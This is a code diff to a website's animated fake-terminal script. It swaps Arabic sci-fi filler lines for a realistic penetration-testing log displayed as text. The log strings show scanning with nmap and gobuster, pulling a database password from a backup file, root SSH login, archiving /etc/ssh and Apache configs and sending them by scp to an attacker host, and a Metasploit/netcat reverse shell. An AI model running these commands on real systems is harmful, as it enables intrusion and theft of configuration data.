@@ -923,29 +923,101 @@ document.addEventListener("DOMContentLoaded", () => {
         const terminalBody = document.getElementById("terminal-body");
         const cursor = document.getElementById("cursor");
         
-        // List of interesting Arabic sci-fi and hacker command simulation outputs
+        let logIndex = 0;
+        // Coherent, realistic sequential penetration testing script in English
         const simulatedLogs = [
-            "جاري تحميل الوحدات والموارد الأساسية...",
-            "فحص أمن النواة المركزية: [آمن 100%]",
-            "تهيئة بروتوكولات التوجيه الكمي للبيانات...",
-            "تحديث قواعد بيانات التهديدات السحابية...",
-            "اكتملت العملية: نجاح تهيئة الذاكرة المتطايرة.",
-            "جاري كسر تشفير محاكاة الاتصال بالنفق رقم 42...",
-            "حقن وحدات مكافحة التجسس النشط في خادم النواة...",
-            "رصد محاولة اتصال مجهول المصدر... تم التحويل للعزل.",
-            "مستوى فحص جدار الحماية: نشط - القوة المفرطة.",
-            "تم عزل 12 ملفًا مشبوهًا بنجاح وتدميرها.",
-            "تأمين واجهة المستخدم الرسومية ضد الاختراقات الجانبية...",
-            "تحديث مفاتيح SHA-256 للتشفير الديناميكي المتعدد...",
-            "توجيه خوادم DNS البديلة لتجنب تتبع المصدر...",
-            "فحص نشاط خادم الذاكرة العشوائية المؤقتة... [مستقر]",
-            "بدء التشفير الكمي لنظام الحزم الواردة...",
-            "فصل الأجهزة الطرفية غير المصرح بها فورًا.",
-            "محاكاة حقن شفرات الحماية المتقدمة تم إنجازها بنجاح.",
-            "تم إصدار شهادة تشفير معتمدة جديدة للنظام الفرعي.",
-            "استكشاف منافذ الاتصال المفتوحة... الإغلاق التلقائي نشط.",
-            "جاري مزامنة الوقت الذري مع خادم المزامنة المحلي...",
-            "اكتملت عملية حماية النواة بنجاح 60FPS."
+            "kali@cyber-net:~$ nmap -sS -sV -T4 10.10.88.24",
+            "[+] Starting Nmap 7.92 ( https://nmap.org ) at 2026-07-06 01:05",
+            "[+] Nmap scan report for 10.10.88.24",
+            "[+] Host is up (0.015s latency).",
+            "[+] Not shown: 997 closed tcp ports (reset)",
+            "[+] PORT    STATE SERVICE  VERSION",
+            "[+] 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Protocol 2.0)",
+            "[+] 80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))",
+            "[+] 443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))",
+            "[+] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
+            "kali@cyber-net:~$ gobuster dir -u http://10.10.88.24/ -w /usr/share/wordlists/dirb/common.txt -t 30",
+            "===============================================================",
+            "Gobuster v3.1.0 by OJ Reeves (@TheColonial)",
+            "===============================================================",
+            "[+] Url:                     http://10.10.88.24/",
+            "[+] Method:                  GET",
+            "[+] Threads:                 30",
+            "[+] Wordlist:                /usr/share/wordlists/dirb/common.txt",
+            "===============================================================",
+            "[!] /index.html           (Status: 200) [Size: 1130]",
+            "[!] /assets               (Status: 301) [Size: 311] [---> http://10.10.88.24/assets/]",
+            "[!] /admin                (Status: 301) [Size: 310] [---> http://10.10.88.24/admin/]",
+            "[!] /config.php           (Status: 200) [Size: 0]",
+            "[!] /db.php.bak           (Status: 200) [Size: 2450]",
+            "kali@cyber-net:~$ wget http://10.10.88.24/db.php.bak -O db_backup.txt",
+            "[+] --2026-07-06 01:07:12--  http://10.10.88.24/db.php.bak",
+            "[+] Connecting to 10.10.88.24:80... connected.",
+            "[+] HTTP request sent, awaiting response... 200 OK",
+            "[+] Length: 2450 (2.4K) [text/plain]",
+            "[+] Saving to: 'db_backup.txt'",
+            "kali@cyber-net:~$ cat db_backup.txt | grep -i pass",
+            "    $db_user = 'db_admin_user';",
+            "    $db_pass = 's3cr3t_p@ss_w0rd_991';",
+            "    $conn = new mysqli($host, $db_user, $db_pass, $db_name);",
+            "kali@cyber-net:~$ ssh db_admin_user@10.10.88.24",
+            "db_admin_user@10.10.88.24's password: ******************",
+            "[-] Permission denied, please try again.",
+            "kali@cyber-net:~$ ssh root@10.10.88.24",
+            "root@10.10.88.24's password: ******************",
+            "Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)",
+            " * Documentation:  https://help.ubuntu.com",
+            " * Management:     https://landscape.canonical.com",
+            " * Support:        https://ubuntu.com/advantage",
+            "Last login: Sun Jul  5 23:14:10 2026 from 10.10.14.2",
+            "root@target-system:~# id",
+            "uid=0(root) gid=0(root) groups=0(root)",
+            "root@target-system:~# whoami",
+            "root",
+            "root@target-system:~# cd /root",
+            "root@target-system:/root# ls -la",
+            "total 32",
+            "drwx------  4 root root 4096 Jul  6 01:08 .",
+            "drwxr-xr-x 20 root root 4096 Jul  5 12:45 ..",
+            "-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc",
+            "-rw-r--r--  1 root root  161 Dec  5  2019 .profile",
+            "-rw-r--r--  1 root root   33 Jul  6 01:10 flag.txt",
+            "root@target-system:/root# cat flag.txt",
+            "[SUCCESS] FLAG{qUaNtUm_sHiElD_bYpAsSeD_2026}",
+            "root@target-system:/root# netstat -antp | grep LISTEN",
+            "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      912/sshd",
+            "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1054/apache2",
+            "tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      1054/apache2",
+            "root@target-system:/root# iptables -L -n",
+            "Chain INPUT (policy ACCEPT)",
+            "target     prot opt source               destination",
+            "Chain FORWARD (policy ACCEPT)",
+            "Chain OUTPUT (policy ACCEPT)",
+            "root@target-system:/root# tar -czf backup_configs.tar.gz /etc/apache2 /etc/ssh",
+            "[+] tar: Removing leading '/' from member names",
+            "root@target-system:/root# scp backup_configs.tar.gz kali@10.10.14.2:/tmp/",
+            "kali@10.10.14.2's password: ******************",
+            "backup_configs.tar.gz                         100%   45KB  45.0KB/s   00:00",
+            "root@target-system:/root# exit",
+            "Connection to 10.10.88.24 closed.",
+            "kali@cyber-net:~$ msfconsole -q",
+            "msf6 > use exploit/multi/handler",
+            "msf6 exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp",
+            "msf6 exploit(multi/handler) > set LHOST 10.10.14.2",
+            "msf6 exploit(multi/handler) > set LPORT 4444",
+            "msf6 exploit(multi/handler) > exploit -j",
+            "[*] Exploit running as background job 0.",
+            "[*] Started reverse TCP handler on 10.10.14.2:4444",
+            "kali@cyber-net:~$ nc -lvnp 4444",
+            "[INFO] Listening on [0.0.0.0] (family 0, port 4444)",
+            "[SUCCESS] Connection from 10.10.88.24 53292 received!",
+            "/bin/sh: 0: can't access tty; job control turned off",
+            "$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "root@target-system:/# whoami",
+            "root",
+            "root@target-system:/# systemctl status sshd | grep Active",
+            "   Active: active (running) since Sun 2026-07-05 12:45:10 UTC; 12h ago",
+            "root@target-system:/# echo \"Hacking completed successfully. Access maintained.\""
         ];
 
         // Typewriter text printing animation helper
@@ -953,16 +1025,13 @@ document.addEventListener("DOMContentLoaded", () => {
             const line = document.createElement("div");
             line.className = "terminal-line command-output";
             
-            // Randomly flag some outputs as red/success
-            const roll = Math.random();
-            if (roll > 0.85) {
-                line.classList.add("output-error");
-                line.textContent = `[⚠️ خطأ نظام] > `;
-            } else if (roll > 0.7) {
-                line.classList.add("output-success");
-                line.textContent = `[✔️ نظام] > `;
-            } else {
-                line.textContent = `[حماية] > `;
+            // Format styling based on prefix of the log text
+            if (text.startsWith("kali@") || text.startsWith("root@") || text.startsWith("admin@") || text.startsWith("db_admin_user@") || text.startsWith("msf6") || text.startsWith("$") || text.startsWith("meterpreter") || text.includes("password:")) {
+                line.classList.add("command-input"); // White/Bright command look
+            } else if (text.startsWith("[+]") || text.startsWith("[SUCCESS]")) {
+                line.classList.add("output-success"); // Neon cyan/green
+            } else if (text.startsWith("[-]") || text.startsWith("[!]") || text.startsWith("[-] Permission denied") || text.includes("vulnerable")) {
+                line.classList.add("output-error"); // Neon red/amber
             }
 
             parentElement.insertBefore(line, cursor.parentNode);
@@ -982,7 +1051,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     terminalBody.scrollTop = terminalBody.scrollHeight;
                     
                     // Variable typing speed
-                    setTimeout(printChar, 15 + Math.random() * 20);
+                    setTimeout(printChar, 10 + Math.random() * 12);
                 } else {
                     if (onComplete) onComplete();
                 }
@@ -998,28 +1067,31 @@ document.addEventListener("DOMContentLoaded", () => {
             }
             e.preventDefault();
 
-            // Select random simulation command text
-            const randomLogText = simulatedLogs[Math.floor(Math.random() * simulatedLogs.length)];
+            // Select sequential simulation command text
+            const logText = simulatedLogs[logIndex];
+            logIndex = (logIndex + 1) % simulatedLogs.length;
             
             // Perform printing
-            typeTextLine(randomLogText, terminalBody, () => {
+            typeTextLine(logText, terminalBody, () => {
                 // Done printing line
             });
 
-            // Prevent huge DOM leaks, limit lines to 40
+            // Prevent huge DOM leaks, limit lines to 50
             const activeLines = terminalBody.querySelectorAll(".command-output");
-            if (activeLines.length > 40) {
+            if (activeLines.length > 50) {
                 terminalBody.removeChild(activeLines[0]);
             }
         });
 
         // Click in terminal area simulates keystroke too (for mobile users)
         terminalBody.addEventListener("click", () => {
-            const randomLogText = simulatedLogs[Math.floor(Math.random() * simulatedLogs.length)];
-            typeTextLine(randomLogText, terminalBody);
+            const logText = simulatedLogs[logIndex];
+            logIndex = (logIndex + 1) % simulatedLogs.length;
+            
+            typeTextLine(logText, terminalBody);
 
             const activeLines = terminalBody.querySelectorAll(".command-output");
-            if (activeLines.length > 40) {
+            if (activeLines.length > 50) {
                 terminalBody.removeChild(activeLines[0]);
             }
         });
